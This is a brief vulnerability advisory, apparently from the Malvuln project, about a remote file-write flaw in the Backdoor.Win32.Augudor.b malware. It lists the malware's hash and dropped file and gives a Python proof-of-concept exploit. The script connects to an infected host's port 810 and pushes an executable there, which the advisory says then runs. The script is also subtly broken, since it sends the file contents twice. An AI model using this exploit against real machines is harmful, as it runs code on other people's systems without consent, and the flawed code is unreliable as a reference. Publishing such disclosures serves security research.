Threat: Backdoor.Win32.Augudor.b
Vulnerability: Remote File Write Code Execution
Description: The malware drops an empty file named "zy.exe" and listens on
TCP port 810. Third-party adversaries who can reach the infected host can
write executable code to the empty "zy.exe" file on the system via a socket
program and it will execute as soon as the binary transfer has completed.
Successfully tested with a 880 byte executable.
Family: Augudor
Type: PE32
MD5: 94ccd337cbdd4efbbcc0a6c888abb87d
Vuln ID: MVID-2022-0644
Dropped files: zy.exe
Disclosure: 09/25/2022

Exploit/PoC:
from socket import *

MALWARE_HOST="x.x.x.x"
PORT=810
DOOM="DOOM_SM.exe" #880 bytes

def doit():
    s=socket(AF_INET, SOCK_STREAM)
    s.connect((MALWARE_HOST, PORT))

    f = open(DOOM, "rb")
    EXE = f.read()
    s.send(EXE)

    while EXE:
        s.send(EXE)
        EXE=f.read()

    s.close()

    print("By Malvuln");

if __name__=="__main__":
    doit()
